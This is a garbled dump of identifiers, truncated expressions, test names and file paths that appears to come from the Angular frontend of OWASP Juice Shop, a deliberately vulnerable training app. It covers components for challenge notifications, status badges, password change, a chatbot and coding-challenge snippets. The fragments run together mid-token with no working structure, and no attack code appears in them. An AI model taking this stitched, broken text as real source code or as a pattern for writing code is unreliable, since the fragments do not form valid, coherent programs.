year'saveProgress'should throw error when not supplied with a valid continue code''should log error from continue code API call directly to browser console''should show CTF flag codes if configured accordingly''should hide CTF flag codes if configured accordingly''should hide CTF flag codes by default''should hide FBCTF-specific country details by default''should not load countries for FBCTF when configured to hide country details'countryMaptoBeUndefined../Services/country-mapping.service/Services/country-mapping../Services/challenge.service../Services/socket-io.service/Services/socket-io./challenge-solved-notification.component/challenge-solved-notificationclass M ... \n  }\r\n}on (str ... ()\r\n  }callback()emit (a ... ll\r\n  }return null'Challe ... ponent'let soc ... ce: anysocketIoService: anylet tra ... ce: anytransla ... ce: anylet con ... ce: anyconfigu ... ce: anylet mockSocket: anymockSocket: anymockSoc ... ocket()new MockSocket()socketI ... cket'])jasmine ... cket'])['socket']socketI ... Socket)socketI ... rnValuesocketI ... ket.andsocketI ... .socketcookieS ... 'put'])['put']challen ... Code'])jasmine ... Code'])['continueCode']configu ... of({}))[Challe ... ponent]'should ... ctions'should delete notifictionscompone ... \r\n    ]compone ... cations{ messa ... false }message: 'foo'flag: '1234'1234copied: falsemessage: 'bar'flag: '5678'5678compone ... tion(0)compone ... icationexpect( ... lse }])expect( ... ations)[{ mess ... alse }]'should ... ressed'should delete all notifications if the shiftKey was pressedcompone ... , true)'should ... cation'should add new notificationtransla ... LVED'))of('CHA ... OLVED')CHALLENGE_SOLVEDcompone ... ns = []compone ... 234' }){ chall ... 1234' }challenge: 'Test'expect( ... est' }){ chall ... Test' }expect( ... ned }])[{ mess ... ined }]{ messa ... fined }message ... SOLVED'country: undefined'should ... 1 year'should store retrieved continue code as cookie for 1 yearchallen ... 2345'))challen ... rnValuechallen ... ode.andchallen ... nueCodeof('12345')compone ... gress()compone ... rogressexpect( ... ires })'should ... e code'should throw error when not supplied with a valid continue codechallen ... fined))of(undefined)expect( ... ogress)should log error from continue code API call directly to browser consolechallen ... rror'))'should ... dingly'should show CTF flag codes if configured accordinglyconfigu ... e } }))of({ ct ... ue } }){ ctf:  ... rue } }ctf: {  ...  true }{ showF ...  true }should hide CTF flag codes if configured accordinglyof({ ct ... se } }){ ctf:  ... lse } }ctf: {  ... false }{ showF ... false }'should ... efault'should hide CTF flag codes by defaultof({ ctf: { } }){ ctf: { } }ctf: { }should hide FBCTF-specific country details by defaultexpect( ... 'none')should not load countries for FBCTF when configured to hide country detailsconfigu ... ' } }))of({ ct ... e' } }){ ctf:  ... ne' } }ctf: {  ... none' }{ showC ... none' }showCou ...  'none'expect( ... fined()expect( ... definedexpect( ... tryMap)component.countryMapP:/My Drive/Git/juice-shop/frontend/src/app/challenge-solved-notification/challenge-solved-notification.component.tsChangeDetectorRef'src/app/Services/country-mapping.service'ChallengeSolvedMessageChallengeSolvedNotification'app-challenge-solved-notification''./challenge-solved-notification.component.html''./challenge-solved-notification.component.scss'countryMappingService'challenge solved''../../confetti'shootConfetti'notification received''verifyCloseNotificationsChallenge'toPromisechallengeSolved'Received invalid continue code from the server!''src/ap ... ervice'src/app/Services/country-mapping.servicesrc/app/Services/country-mappinginterfa ...  any\r\n}Challen ... Messagehidden?: anyisRestore?: anyflag: anykey?: anyChallen ... icationcountry ... tring }{ code: ... tring }code: string,copied: booleanselecto ... cation''app-ch ... cation''./chal ... t.html'./challenge-solved-notification.component.html['./cha ... .scss']'./chal ... t.scss'./challenge-solved-notification.component.scssChallen ... ation[]public  ...  'none'public  ... p?: anyconstru ...  {\r\n  }country ... Service{\r\n  }this.io ...      })this.io.socket().onthis.io.socket()this.io.socketthis.iochallenge solved(data:  ...       }if (dat ...       }data?.challengeif (!da ...       }!data.hiddendata.hiddenthis.sh ... n(data)this.sh ... ication!data.isRestoredata.isRestorethis.saveProgress()this.saveProgressimport( ...      })import( ... ').thenimport( ... fetti')../../confetti/confettimodule  ...       }module. ... fetti()module.shootConfettithis.io ... a.flag)this.io ... ().emit'notifi ... ceived'notification receiveddata.flagthis.co ... \n    })config?.ctfconfig. ... cationsconfig.ctfthis.sh ... cationsthis.sh ... = falseconfig. ...  'none'this.co ... pping()this.co ... Mapping(countr ...       }this.co ... ntryMapthis.countryMapthis.sh ...  'none'closeNo ... ()\r\n  }if (shi ... \r\n    }this.ng ...      })this.io ... ations)'verify ... llenge'verifyCloseNotificationsChallengethis.notificationsthis.no ... ns = []this.no ... dex, 1)this.no ... .splicethis.re ... anges()this.re ... Changesthis.refshowNot ... })\r\n  }this.tr ... d).thenthis.tr ... tionId)this.tr ... ().thenthis.tr ... omise()this.tr ... Promisethis.tr ... enge }){ chall ... lenge }challen ... allengechallenge.challenge(challe ... eSolved(transl ... ationId(messag ... \r\n    }let countryif (thi ...       }country ... ge.key]this.co ... ge.key]challenge.keythis.no ...      })this.no ... ns.pushflag: challenge.flagchallenge.flagsavePro ... })\r\n  }this.ch ... err) })this.ch ... bscribe(contin ... \r\n    }if (!co ...       }!continueCodethrow ( ... ver!'))(new Er ... ver!'))new Err ... rver!')'Receiv ... erver!'Received invalid continue code from the server!private ... ctorRefP:/My Drive/Git/juice-shop/frontend/src/app/challenge-status-badge/challenge-status-badge.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/challenge-status-badge!challe ... .solved!challe ... bledEnvchallen ... bledEnvchallenge.solved'.solved'challen ... solved'challenge.name.solvedrepeatNotification()allowRepeatNotifications'NOTIFICATION_RESEND_INSTRUCTIONS'allowRe ...  : nullallowRe ... cations('NOTIF ... nslate)'NOTIFI ... anslate'NOTIFI ... CTIONS'NOTIFICATION_RESEND_INSTRUCTIONS!allowR ... cations!challenge.solved'.notSolved'challen ... Solved'.notSolvedopenHintopenHint()showChallengeHintsshowCha ...  : nullchallenge.hint!showCh ... hintUrl!showChallengeHints!challenge.hintUrlchallenge.hintUrlshowCha ... hintUrl'.unavailable'challen ... ilable'.unavailable'Windows'challen ... indows'{{ 'icon-' + challenge.disabledEnv?.toString().toLowerCase() }}'icon-''icon-' ... rCase()icon-challen ... rCase()challen ... werCasechallen ... tring()challen ... oString{{ 'fab fa-' + challenge.disabledEnv?.toString().toLowerCase() }}'fab fa-''fab fa ... rCase()fab fa-challenge.disabledEnv[id]challenge.name + '.unavailable'[matTooltip]{{'STATUS_UNAVAILABLE' | translate}}'STATUS_UNAVAILABLE''STATUS ... anslateSTATUS_UNAVAILABLEchallenge.disabledEnv === 'Windows'challenge.disabledEnv !== 'Windows'!challenge.disabledEnv && !challenge.solvedchallenge.name + '.notSolved'showChallengeHints ? challenge.hint : null{{'STATUS_UNSOLVED' | translate}}'STATUS_UNSOLVED'STATUS_UNSOLVEDshowChallengeHints && challenge.hintUrl!showChallengeHints || !challenge.hintUrl!challenge.disabledEnv && challenge.solvedchallenge.name + '.solved'allowRepeatNotifications ? ('NOTIFICATION_RESEND_INSTRUCTIONS' | translate) : null{{'STATUS_SOLVED' | translate}}'STATUS_SOLVED'STATUS_SOLVED!allowRepeatNotificationsP:/My Drive/Git/juice-shop/frontend/src/app/challenge-status-badge/challenge-status-badge.component.spec.ts'./challenge-status-badge.component''../Services/window-ref.service''ChallengeStatusBadgeComponent'windowRefService'repeatNotification''should show notification for selected challenge when enabled''Challenge #1''should scroll to top of screen when notification is repeated''scrollTo''should log the error from backend on failing to repeat notification''should happen when challenge has a hint URL''hint://c1.test''_blank''should not happen when challenge has no hint URL''Challenge #2''should not happen when hints are not turned on in configuration'./challenge-status-badge.component/challenge-status-badge../Services/window-ref.servicelet win ... ce: anywindowR ... ce: anychallen ... tion'])['repea ... ation']challen ... of({}))challen ... ion.andchallen ... icationwindowR ... ervice)'should ... nabled'should show notification for selected challenge when enabled() => { ... ))\r\n  }compone ...  = truecompone ... allengecomponent.challenge{ name: ... allenge{ name: ...  true }name: 'Challenge #1'Challenge #1solved: truecompone ... ation()expect( ... e #1'))expect( ... cation)encodeU ... ge #1')'should ... peated'should scroll to top of screen when notification is repeatedspyOn(w ... ollTo')windowR ... eWindowexpect( ... h(0, 0)expect( ... rollTo)windowR ... crollToshould log the error from backend on failing to repeat notification'should ... nt URL'should happen when challenge has a hint URLcompone ... geHints{ name: ... test' }hintUrl ... 1.test'hint://c1.testhint://c1spyOn(w ... 'open')component.openHint()component.openHintexpect( ... blank')expect( ... w.open)windowR ... ow.openshould not happen when challenge has no hint URL{ name: ... e #2' }name: 'Challenge #2'Challenge #2expect( ... en).notshould not happen when hints are not turned on in configurationcompone ... = falseP:/My Drive/Git/juice-shop/frontend/src/app/challenge-status-badge/challenge-status-badge.component.tsfaWindows'app-challenge-status-badge''./challenge-status-badge.component.html''./challenge-status-badge.component.scss'library ... indows)selecto ... -badge''app-ch ... -badge'app-challenge-status-badge./challenge-status-badge.component.html./challenge-status-badge.component.scsspublic  ... allenge@Input()Input(){ } as ChallengerepeatN ...  }\r\n  }this.al ... cationsthis.ch ... .name))this.ch ... icationencodeU ... e.name)this.challenge.namethis.challengethis.wi ... o(0, 0)this.wi ... crollTothis.wi ... eWindowthis.wi ... ServiceopenHin ...  }\r\n  }this.sh ... hintUrlthis.sh ... geHintsthis.ch ... hintUrlthis.wi ... blank')this.wi ... ow.openP:/My Drive/Git/juice-shop/frontend/src/app/change-password/change-password.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/change-passwordpasswordControldirtynewPasswordControlrepeatNewPasswordControl!(confi ... .dirty)(confir ... .dirty)confirm ... l.dirty!passwo ... l.dirtypasswor ... l.dirty!newPas ... l.dirtynewPass ... l.dirty!repeat ... l.dirtyrepeatN ... l.dirtyrepeatN ... Control!(error ... .dirty)(error  ... .dirty)error & ... l.dirty{{'MANDATORY_CURRENT_PASSWORD' | translate }}'MANDATORY_CURRENT_PASSWORD''MANDAT ... SSWORD'MANDATORY_CURRENT_PASSWORDpasswor ... invalidnewPass ... equirednewPass ... invalidnewPass ... .errorsminlengthmaxlengthnewPass ... length)(newPas ... length)newPass ... xlengthnewPass ... nlength'5-40'{length: '5-40'}length: '5-40'5-40repeatN ... equiredrepeatN ... invalidrepeatN ... .errorsnotSamerepeatN ... notSamechangePassword()margin-bottom: 20px;changeButtonpasswordControl.invalid || newPasswordControl.invalid || repeatNewPasswordControl.invalidButton to confirm the change{{'BTN_CHANGE' | translate}}'BTN_CHANGE''BTN_CH ... anslateBTN_CHANGEfar fa-edit fa-lgaria-hiddenpassword-formrepeatNewPasswordControl.invalid && repeatNewPasswordControl.errors.notSamerepeatNewPasswordControl.invalid && repeatNewPasswordControl.errors.required{{passwordRepeat.value?.length || 0}}passwordRepeatpasswor ... th || 0passwor ... .lengthpasswordRepeat.valuenewPasswordControl?.invalid && (newPasswordControl?.errors.minlength || newPasswordControl?.errors.maxlength)newPasswordControl?.invalid && newPasswordControl?.errors.required{{password.value?.length || 0}}password.value{{ 'INVALID_PASSWORD_LENGTH' | translate: {length: '5-40'} }}'INVALID_PASSWORD_LENGTH''INVALI ... '5-40'}'INVALI ... LENGTH'INVALID_PASSWORD_LENGTHpasswordControl.invalidcurrentPasswordField to enter the current password!(error && !passwordControl.dirty && !newPasswordControl.dirty && !repeatNewPasswordControl.dirty){{ error }}!(confirmation && !passwordControl.dirty && !newPasswordControl.dirty && !repeatNewPasswordControl.dirty){{ confirmation }}P:/My Drive/Git/juice-shop/frontend/src/app/change-password/change-password.component.spec.ts'./change-password.component''ChangePasswordComponent''changePassword''should be compulsory to give password''pass''length of new password must be 5-40 characters''old''new password''new password new password''new password new password new password new password''should be compulsory to repeat new password''passed''password''newPassword''should clear form and show confirmation after changing password''foobar'toBeDefined'should clear form and gracefully handle error on password change''resetPasswords''fooabar'resetPasswords./change-password.component/change-password'Change ... ponent'userSer ... word'])jasmine ... word'])['changePassword']userSer ... of({}))userSer ... ord.anduserSer ... assword[Change ... ponent]provide ... vice }][{ prov ... vice }]'should ... ssword'should be compulsory to give passwordcompone ... 'pass')passit('len ... )\r\n  })'length ... acters'length of new password must be 5-40 characterscompone ... ('old')oldcompone ... sword')new password'new pa ... ssword'new password new passwordnew password new password new password new passwordshould be compulsory to repeat new passwordcompone ... assed')passednewPasswordshould clear form and show confirmation after changing passwordcompone ... oobar')foobarcompone ... sword()compone ... asswordexpect( ... Definedexpect( ... mation)compone ... rmation'should ... change'should clear form and gracefully handle error on password changespyOn(c ... words')compone ... oabar')fooabarexpect( ... swords)compone ... sswordsP:/My Drive/Git/juice-shop/frontend/src/app/change-password/change-password.component.tsAbstractControlfaSave'app-change-password''./change-password.component.html''./change-password.component.scss'minLengthmatchValidator'password-form''changeButton'/support@.*//(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,30}/'Parola echipei de asisten nu respect politica corporativ pentru conturile privilegiate! V rugm s schimbai parola n consecin!''PASSWORD_SUCCESSFULLY_CHANGED'passwordSuccessfullyChangedmatchOtherValidatetype AbstractControllibrary ... faEdit)selecto ... ssword''app-ch ... ssword'app-change-password'./chan ... t.html'./change-password.component.html'./chan ... t.scss'./change-password.component.scsspublic  ... h(40)])new Unt ... h(40)])[Valida ... th(40)]Validat ... ngth(5)Validators.minLengthValidat ... gth(40)public  ... trol)])new Unt ... trol)])[Valida ... ntrol)]matchVa ... ontrol)this.ne ... Controlthis.fo ... rd() })() => { ... ord() }{ this. ... ord() }this.ch ... sword()this.changePasswordchangeP ... })\r\n  }localSt ... 2,30}/)localSt ... rt@.*/)localSt ... ?.matchsupport@.*support@!this.n ... 2,30}/)this.ne ... 2,30}/)this.ne ... e.matchthis.ne ... l.value/(?=.*[ ... 12,30}/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{12,30}(?=.*[a-z]).*[a-z][a-z]a-z(?=.*[A-Z]).*[A-Z][A-Z]A-ZZ(?=.*\d).*\d\d(?=.*[@$!%*?&]).*[@$!%*?&][@$!%*?&][A-Za-z\d@$!%*?&]{12,30}[A-Za-z\d@$!%*?&]console ... in\u021b\u0103!')console.error'Parola ... cin\u021b\u0103!'Parola echipei de asisten nu respect politica corporativ pentru conturile privilegiate! V rugm s schimbai parola n consecin!this.us ... asswordcurrent ... l.valuethis.pa ... l.valuethis.passwordControlnew: th ... l.valuerepeat: ... l.valuethis.re ... l.valuethis.re ... Control(respon ... \r\n    }this.er ... definedthis.tr ... ANGED')'PASSWO ... HANGED'PASSWORD_SUCCESSFULLY_CHANGED(passwo ...       }passwor ... Changedthis.co ... Changedthis.confirmationthis.co ... ionId }{ error ... ionId }error: translationId(error) ... \r\n    }console.log(error)this.error = errorthis.re ... words()this.resetPasswordsresetFo ... ()\r\n  }this.pa ... lue('')this.pa ... etValueresetPa ... ()\r\n  }this.pa ... stine()this.pa ... ristinethis.pa ... uched()this.pa ... touchedthis.ne ... lue('')this.ne ... etValuethis.ne ... stine()this.ne ... ristinethis.ne ... uched()this.ne ... touchedthis.re ... lue('')this.re ... etValuethis.re ... stine()this.re ... ristinethis.re ... uched()this.re ... touchedreturn  ... ll\r\n  }functio ... ll\r\n  }const p ... l.valuepasswor ... l.valuenewPass ... l.valuerepeatN ... l.valueif (pas ... \r\n    }passwor ... dRepeatreturn  ...  true }{ notSame: true }notSame: trueP:/My Drive/Git/juice-shop/frontend/src/app/chatbot/chatbot.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/chatbotmessages; index as index=='bot'message ... = 'bot'message.authorbot{{juicyImageSrc}}juicyImageSrcmessage ...  'user'{{profileImageSrc}}profileImageSrc{{message.author == 'user' ? 'speech-bubble-right' : 'speech-bubble-left'}}'speech-bubble-right''speech-bubble-left'message ... e-left''speech ... -right'speech-bubble-rightspeech-bubble-leftmessageControl{{ 'ASK_ME_ANYTHING_PLACEHOLDER' | translate}}'ASK_ME_ANYTHING_PLACEHOLDER''ASK_ME ... anslate'ASK_ME ... HOLDER'ASK_ME_ANYTHING_PLACEHOLDERsendMessage()chat-containerchat-boxmessage-box-containerform-wrapperchat-windowlet message of messages; index as indexmessage-container{{message.body}}message.bodymessage.author == 'user'profile-imagemessage.author == 'bot'juicy-chat-bot-image{{"SECTION_SUPPORT_CHAT" | translate}}"SECTION_SUPPORT_CHAT""SECTIO ... anslate"SECTIO ... T_CHAT"SECTION_SUPPORT_CHATpowered-by{{"LABEL_POWERED_BY_CHATBOT" | translate: { chatbot: 'juicy-chat-bot' } }}"LABEL_POWERED_BY_CHATBOT"'juicy-chat-bot'"LABEL_ ... -bot' }"LABEL_ ... HATBOT"LABEL_POWERED_BY_CHATBOT{ chatb ... -bot' }chatbot ... at-bot'juicy-chat-botP:/My Drive/Git/juice-shop/frontend/src/app/chatbot/chatbot.component.spec.ts'../Services/chatbot.service''./chatbot.component'MessageSources'ComplaintComponent'chatbotService'getChatbotStatus''getResponse''hello there''should initially have 1 message intially'messages'should record and display user messages''Message''Responds to user messages'../Services/chatbot.service./chatbot.componentenum Me ... bot'\r\n}user = 'user'bot = 'bot'chatbotService: anychatbot ... onse'])jasmine ... onse'])['getCh ... ponse']chatbot ...     }))chatbot ... rnValuechatbot ... tus.andchatbot ... tStatusof({\r\n  ... \n    })body: 'hello there'hello therechatbot ... nse.andchatbot ... esponse[ChatbotComponent]'should ... tially'should initially have 1 message intiallyexpect( ... qual(1)component.messagesexpect( ... ges[0])compone ... ages[0]author: ... ces.botMessageSources.bot'should ... ssages'should record and display user messagescompone ... ssage')Messagecompone ... ssage()compone ... Messageexpect( ... ges[1])compone ... ages[1]author: ... es.userMessageSources.userbody: 'Message'it('Res ... )\r\n  })'Respon ... ssages'Responds to user messagesexpect( ... qual(3)expect( ... ges[2])compone ... ages[2]P:/My Drive/Git/juice-shop/frontend/src/app/chatbot/chatbot.component.tsfaBombChatMessageMessageActionsnamequery'app-chatbot''./chatbot.component.html''./chatbot.component.scss''assets/public/images/ChatbotAvatar.png''assets/public/images/uploads/default.svg'messageActions'setname'currentActionchatScrollDownTimeoutIdReturnTypehandleResponsemessageBodychat'chat-window'250library.add(faBomb)Message ... ces.botbody: stringresponse: stringnamequery: stringselecto ... hatbot'app-chatbot'./chat ... t.html'./chatbot.component.html'./chat ... t.scss'./chatbot.component.scssChatMessage[]public  ... ar.png''assets ... ar.png'assets/public/images/ChatbotAvatar.pngassets/public/images/ChatbotAvatarpublic  ... lt.svg''assets ... lt.svg'assets/public/images/uploads/default.svgassets/public/images/uploads/defaultpublic  ... e'\r\n  }response: 'query'namequery: 'setname'setnamepublic  ... esponsethis.me ... esponsethis.messageActionsprivate ...  = nullchatScr ... meoutIdReturnT ...  | nullReturnT ... imeout>typeof setTimeoutthis.ch ... meoutIdclearTi ... eoutId)this.ch ... \n    })this.ch ... tatus()this.ch ... tStatusthis.chatbotServicethis.me ...      })this.messages.pushthis.messagesbody: response.bodyresponse.bodyif (res ...       }response.actionthis.cu ... action]this.currentActionthis.me ... action]this.us ... hoAmI()this.us ... .whoAmI(user:  ... \r\n    }this.pr ... leImagethis.profileImageSrcuser.profileImagehandleR ...  }\r\n  }this.me ... \n    })if (res ... \r\n    }response.tokenlocalSt ... .token)expires ... () + 8)expires.setHoursexpires ... s() + 8expires.getHours()expires.getHourssendMes ...  }\r\n  }const m ... l.valuemessage ... l.valuethis.me ... l.valuethis.messageControlif (mes ... \r\n    }body: messageBodythis.me ... lue('')this.me ... etValuethis.ch ...      })(respon ...       }if (!re ...       }!respon ... .action!response.statusresponse.status!response.actionthis.ch ... geBody)this.ch ... esponsethis.ha ... sponse)this.handleResponsethis.ch ... }, 250)setTime ... }, 250)const c ... indow')chat =  ... indow')documen ... indow')documen ... entByIdchat.sc ... lHeightchat.scrollTopchat.scrollHeightthis.ch ...  = nullP:/My Drive/Git/juice-shop/frontend/src/app/code-area/code-area.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/code-arealineMarkers'line'marker'line'  ... eNumbermarker.lineNumberselectLinesselectL ... Number)langscode-areapre[highlight][lineNumbers][languages]emphasizelet marker of lineMarkerslineMarker'line' + marker.lineNumberselectLines(marker.lineNumber){{ marker.marked ? '' : ''}}marked''''marker. ...  : '\u1f532\udd32'marker.marked'\u2705''\u1f532\udd32'P:/My Drive/Git/juice-shop/frontend/src/app/code-area/code-area.component.spec.ts'./code-area.component''CodeAreaComponent''should generate unchecked markers for each line of the code snippet''Line 1\nLine2\nLine3''should emit selected line of code when no lines were previously selected'addLine'emit''should emit selected line of code including previously selected lines''should emit selected lines of code minus a deselected one'./code-area.component/code-areaasync ( ... ()\r\n  }await T ... nents()[CodeAreaComponent]'should ... nippet'should generate unchecked markers for each line of the code snippetcompone ... nLine3'component.code'Line 1 ... nLine3'Line 1
Line2
Line3expect( ... arkers)compone ... Markers[{ line ... alse }]{ lineN ... false }lineNumber: 1marked: falselineNumber: 2lineNumber: 3'should ... lected'should emit selected line of code when no lines were previously selectedcompone ... emit'])component.addLinejasmine ... emit'])['emit']compone ... alse }]compone ... ines(2)compone ... ctLinesexpect( ... th([2])expect( ... e.emit)compone ... ne.emit[2]'should ...  lines'should emit selected line of code including previously selected lines{ lineN ...  true }marked: trueexpect( ... [1, 2])'should ... ed one'should emit selected lines of code minus a deselected onecompone ... true }][{ line ... true }]expect( ... [1, 3])[1, 3]P:/My Drive/Git/juice-shop/frontend/src/app/code-area/code-area.component.ts need to get the marker from index lineNumber - 1 as the array index start at 0, while the lineNumbers start at 1// need ... rt at 1 convert lineMarkers to array of markedLineNumber// conv ... eNumberLineMarker'app-code-area''./code-area.component.html''./code-area.component.scss''code''vulnLines''javascript''typescript''json''yaml''\n'lineIndexmarkedLineNumbersmarked: booleanlineNumber: numberselecto ... e-area'app-code-area'./code ... t.html'./code-area.component.html['./cod ... .scss']'./code ... t.scss'./code-area.component.scsspublic  ... ng = ''@Input('code')Input('code')public  ... umber[]@Input('vulnLines')Input('vulnLines')public  ... arker[]LineMarker[]addLine ... er[]>()new Eve ... er[]>()public  ... 'yaml']['javas ... 'yaml']this.li ... \n    })this.lineMarkersthis.co ... n').mapthis.co ... t('\n')this.code.splitthis.code
(line,  ... \r\n    }return  ...       }lineNum ... dex + 1lineIndex + 1selectL ... s)\r\n  }{\r\n     ... s)\r\n  }const m ... er - 1]marker  ... er - 1]this.li ... er - 1]lineNumber - 1marker. ... .marked!marker.markedconst m ... [] = []markedL ... [] = []for (co ... \r\n    }const { ... umber }{ marke ... umber }if (mar ...       }markedL ... Number)markedL ... rs.pushthis.ad ... umbers)this.addLine.emitthis.addLineP:/My Drive/Git/juice-shop/frontend/src/app/code-fixes/code-fixes.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/code-fixesrandomFixes; index as iselectedFix === ifixfix?.fixlet fix of randomFixes; index as itd-ngx-text-diffP:/My Drive/Git/juice-shop/frontend/src/app/code-fixes/code-fixes.component.spec.ts'./code-fixes.component''CodeFixesComponent''should set the format from cookie if the cookie key exists''hasKey''LineByLine''should set the format to "LineByLine" and save it in the cookie if the cookie key does not exist''code-fixes-component-format'./code-fixes.componentasync ( ... e)\r\n  }imports ... Root()][Cookie ... Root()][CodeFixesComponent][CookieService]'should ... exists'should set the format from cookie if the cookie key existsspyOn(c ... e(true)spyOn(c ... rnValuespyOn(c ... y').andspyOn(c ... asKey')hasKeyspyOn(c ... yLine')spyOn(c ... t').andspyOn(c ...  'get')LineByLineexpect( ... yLine')expect( ... format)component.format'should ...  exist'should set the format to "LineByLine" and save it in the cookie if the cookie key does not existspyOn(c ... (false)spyOn(c ...  'put')'code-f ... format'code-fixes-component-formatP:/My Drive/Git/juice-shop/frontend/src/app/code-fixes/code-fixes.component.tsDoCheckKeyValueDiffersKeyValueDifferNgxTextDiffComponentDiffTableFormat'ngx-text-diff/lib/ngx-text-diff.model'RandomFixes'../code-snippet/code-snippet.component''app-code-fixes''./code-fixes.component.html''./code-fixes.component.scss'differdiffers'snippet''fixes''selectedFix''randomFixes'randomFixes'format''SideBySide''codeComponent'codeComponentngDoCheckdiff'diff-format'forEachChangedItemcurrentValuetype DoChecktype KeyValueDiffer'ngx-te ... .model'ngx-text-diff/lib/ngx-text-diff.modelngx-text-diff/lib/ngx-text-difftype DiffTableFormat'../cod ... ponent'../code-snippet/code-snippet.componenttype RandomFixesselecto ... -fixes'app-code-fixes./code-fixes.component.html./code-fixes.component.scssdiffer: ... Format>KeyValu ... Format>constru ... ()\r\n  }this.di ... reate()this.differthis.di ... .createthis.di ... ind({})this.differs.findthis.differs@Input('snippet')Input('snippet')@Input('fixes')Input('fixes')@Input( ... edFix')Input('selectedFix')@Input( ... Fixes')Input('randomFixes')RandomFixes[]public  ... BySide'@Input('format')Input('format')SideBySidecodeCom ... mponent@ViewCh ... alse })ViewChi ... alse }){ static: false }static: falsengOnIni ...  }\r\n  }this.co ... ormat')this.co ... .hasKeythis.fo ... ormat')this.formatthis.fo ... ByLine'this.co ... yLine')ngDoChe ...  }\r\n  }try {\r\n ... \r\n    }const c ... rmat })change  ... rmat })this.di ... rmat })this.differ.diff{ 'diff ... ormat }'diff-f ... .formatdiff-formatthis.co ... .formatthis.codeComponentif (cha ...       }change. ...       )change. ... gedItemitem => ...       }this.fo ... ntValueitem.currentValuethis.co ... format)catch {\r\n    }{\r\n    }private ... DiffersP:/My Drive/Git/juice-shop/frontend/src/app/code-snippet/code-snippet.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/code-snippettab.valuetoggleTabtoggleTab($event)'TAB_FIND_IT'('TAB_F ... nslate)'TAB_FI ... anslateTAB_FIND_ITsnippet !== nullsnippet?.snippetsnippet?.vulnLinesaddLine($event)snippet === nulllockIcon'lock'lockIco ...  'lock'lockIcon()lockColorlockColor()snippet ... == nullfixes !== nullhint && ... e === 0tab.value === 0explana ... e === 1tab.value === 1resultColor'warn''warn-notification''accent-notification'resultC ... cation'resultC ...  'warn'resultColor()warn-notification'accent ... cation'{'btns-findit': tab.value === 0}changeFixchangeFix($event)fixItthis.sh ... d.fixItthis.sh ... Buttonsthis.solved.fixItthis.solved'https://docs.google.com/forms/d/e/1FAIpQLSdaNEuz0dzFA2sexCa0AJ4QOb2OYdEL04eQOLFD2Y4T-BW6ag/viewform?usp=pp_url&entry.384948954='dialogData'&entry.435235279=Coding+Challenge&entry.1734944650=Yes''https: ... 50=Yes''https: ... ta.name'https: ... 48954='https://docs.google.com/forms/d/e/1FAIpQLSdaNEuz0dzFA2sexCa0AJ4QOb2OYdEL04eQOLFD2Y4T-BW6ag/viewform?usp=pp_url&entry.384948954=dialogData.name'&entry ... 50=Yes'&entry.435235279=Coding+Challenge&entry.1734944650=Yes'&entry.435235279=Coding+Challenge&entry.1734944650=No''https: ... 650=No''&entry ... 650=No'&entry.435235279=Coding+Challenge&entry.1734944650=NocheckLinescheckLines()findItthis.solved.findItcheckFixcheckFix()mat-dialog-actionsdialog-actionbtns[ngClass]fixItSubmitButton[color]{{ resultIcon() }}resultIconresultIcon()findItSubmitButtonmat-dialog-closeclose-dialog buttonsClose Dialog[mat-dialog-close]findItCloseButton{{'BTN_CLOSE' | translate}}'BTN_CLOSE''BTN_CL ... anslateBTN_CLOSEthis.showFeedbackButtons && this.solved.fixIt'https://docs.google.com/forms/d/e/1FAIpQLSdaNEuz0dzFA2sexCa0AJ4QOb2OYdEL04eQOLFD2Y4T-BW6ag/viewform?usp=pp_url&entry.384948954=' + dialogData.name + '&entry.435235279=Coding+Challenge&entry.1734944650=No''https://docs.google.com/forms/d/e/1FAIpQLSdaNEuz0dzFA2sexCa0AJ4QOb2OYdEL04eQOLFD2Y4T-BW6ag/viewform?usp=pp_url&entry.384948954=' + dialogData.name + '&entry.435235279=Coding+Challenge&entry.1734944650=Yes'matNativeControl[value][selected]{{ i+1 }}i+1explanation && tab.value === 1[class]resultColor() === 'warn' ? 'warn-notification' : 'accent-notification'{{explanation}}hint && tab.value === 0primary-notification{{hint}}mat-dialog-contentcode-snippetmat-tab-groupmat-stretch-tabs[selectedIndex](selectedIndexChange)mat-tablockIcon() === 'lock'fxLayoutcolumnfxLayoutGapsnippet !== null && fixes !== null[snippet][fixes][randomFixes][selectedFix]ng-templatemat-tab-label{{'TAB_FIX_IT' | translate}}'TAB_FIX_IT'TAB_FIX_ITmateraial-icons-outlined{{lockIcon()}}[label]('TAB_FIND_IT' | translate)[code][vulnLines](addLine)h2mat-dialog-title{{'TITLE_CODING_CHALLENGE' | translate}}'TITLE_CODING_CHALLENGE''TITLE_ ... anslate'TITLE_ ... LLENGE'TITLE_CODING_CHALLENGE{{dialogData.name}}P:/My Drive/Git/juice-shop/frontend/src/app/code-snippet/code-snippet.component.spec.tsMAT_DIALOG_DATAMatDialogRef'./code-snippet.component''../Services/code-snippet.service''../Services/code-fixes.service''../Services/vuln-lines.service''CodeSnippetComponent'codeSnippetServicecodeFixesServicevulnLinesService'check''should log the error on retrieving configuration''should set the retrieved snippet''Snippet''Default status and icons should reflect both challenge phases yet unsolved''should set status and icons for solved "Find It" phase''should set an error on snippet retrieval as the snippet''should set empty fixes on error during fixes retrieval''selected code lines are set in component''selected code fix is set in component'setFix'selecting a code fix clears previous explanation''Wrong answer!''lock icon is red and "locked" when no fixes are available''lock icon is red and "locked" by default''Fix1''Fix2''Fix3''lock icon is red and "locked" when "Find It" phase is unsolved''lock icon is green and "lock_open" when "Find It" phase is in solved''lock_open''accent''result icon is "send" when choice is not yet submitted''send''result icon is red "clear" when wrong answer has been submitted''clear''result icon is green "check" when right answer has been submitted''correctly submitted vulnerable lines toggle positive verdict for "Find It" phase''correctly submitted vulnerable lines toggle tab to "Fix It" if code fixes exist''correctly submitted fix toggles positive verdict for "Fix It" phase''Fix 1''should remember the original order of available code fix options when shuffling''Fix 2''Fix 3'shuffletoContain./code-snippet.component../Services/code-snippet.service/Services/code-snippet../Services/code-fixes.service/Services/code-fixes../Services/vuln-lines.service/Services/vuln-lines'CodeSn ... ponent'let cod ... ce: anycodeSni ... ce: anycodeFix ... ce: anylet vul ... ce: anyvulnLin 